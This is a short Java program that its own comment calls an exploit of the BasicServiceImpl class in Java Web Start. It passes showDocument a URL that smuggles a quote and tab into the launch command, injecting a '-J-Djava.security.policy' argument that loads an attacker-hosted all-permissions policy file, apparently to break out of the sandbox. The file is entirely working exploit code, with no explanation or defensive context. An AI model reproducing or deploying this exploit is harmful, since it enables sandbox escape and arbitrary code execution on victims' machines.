import java.net.URL;

import javax.jnlp.BasicService;
import javax.jnlp.ServiceManager;

/**
 * 
 * This class exploits the vulnerability within the BasicServiceImpl class.
 * @author mka
 *
 */

public class BasicServiceExploit {

	public static void main(String[] args) {
		if (args == null || args.length < 1) {
			System.exit(1);
		}
		String path = args[0];

		BasicService bs;

		try {

			URL url = new URL(path + "/exploit.jnlp\"" + ((char) 9)
					+ "\"-J-Djava.security.policy=" + path + "/all.policy");

			bs = (BasicService) ServiceManager
					.lookup("javax.jnlp.BasicService");
			bs.showDocument(url);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
